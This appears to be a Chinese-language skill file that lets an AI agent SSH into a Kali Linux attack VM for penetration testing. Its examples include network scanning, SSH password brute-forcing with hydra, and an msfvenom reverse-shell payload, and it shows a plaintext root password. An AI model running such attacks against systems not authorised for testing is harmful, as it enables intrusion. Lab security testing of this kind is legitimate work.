---
name: ssh-kali
description: SSH 连接到 Kali Linux 虚拟攻击机，建立交互式终端会话。当用户说"连上 Kali"、"SSH 到 Kali"、"连攻击机"、"在 Kali 上执行"或需要在 Kali 环境进行渗透测试、漏洞扫描、红队操作时触发此技能。
---

# SSH-Kali 技能

通过 SSH 连接到 Kali Linux 虚拟机，建立交互式终端会话供 AI 执行安全相关操作。

## 配置

连接信息存储在 `~/.qclaw/skills/ssh-kali/config.json`：

```json
{
  "host": "you kali ssh ip",
  "port": 22,
  "username": "you kali ssh username",
  "password": "you kali ssh password",
  "auth_type": "password"
}
```

## 使用方法

### 方式一：执行单条命令（推荐）

使用 `ssh_connect.py` 脚本执行命令并返回输出：

```bash
python ~/.qclaw/skills/ssh-kali/scripts/ssh_connect.py --cmd "命令"
```

示例：
```bash
# 检查连接
python ~/.qclaw/skills/ssh-kali/scripts/ssh_connect.py --cmd "hostname && whoami"

# 执行 nmap 扫描
python ~/.qclaw/skills/ssh-kali/scripts/ssh_connect.py --cmd "nmap -sV 192.168.1.1"

# 查看 Kali 信息
python ~/.qclaw/skills/ssh-kali/scripts/ssh_connect.py --cmd "uname -a && cat /etc/os-release"
```

### 方式二：交互式 SSH 会话

使用 `exec` 工具的 pty 模式建立交互式会话：

```
exec with pty=true, command: ssh -o StrictHostKeyChecking=no root@192.168.136.128
```

首次连接需要手动输入密码 `zcy1`。

**注意**：Windows 上 SSH 交互式输入密码可能不稳定，推荐使用方式一。

## 工作流程

1. 读取 `~/.qclaw/skills/ssh-kali/config.json` 获取连接信息
2. 使用 `ssh_connect.py` 脚本（paramiko）建立 SSH 连接
3. 执行命令并返回输出，或进入交互式 shell

## 常用命令示例

```bash
# 信息收集
python ~/.qclaw/skills/ssh-kali/scripts/ssh_connect.py --cmd "nmap -sV -sC 192.168.1.0/24"

# 漏洞扫描
python ~/.qclaw/skills/ssh-kali/scripts/ssh_connect.py --cmd "nikto -h http://target.com"

# 密码爆破
python ~/.qclaw/skills/ssh-kali/scripts/ssh_connect.py --cmd "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com"

# 反弹 shell 生成
python ~/.qclaw/skills/ssh-kali/scripts/ssh_connect.py --cmd "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.136.128 LPORT=4444 -f elf > /tmp/shell.elf"

# 启动 Metasploit（需要交互式会话）
# 使用方式二进入交互式 shell 后执行 msfconsole
```

## 注意事项

- 密码明文存储在配置文件中，请确保 `~/.qclaw/skills/ssh-kali/` 目录权限安全
- 执行长时间运行的命令（如 msfconsole）建议使用交互式会话
- Kali 虚拟机需开机且网络可达（VMware NAT/桥接模式）
- 脚本依赖 Python paramiko 库（已验证可用）
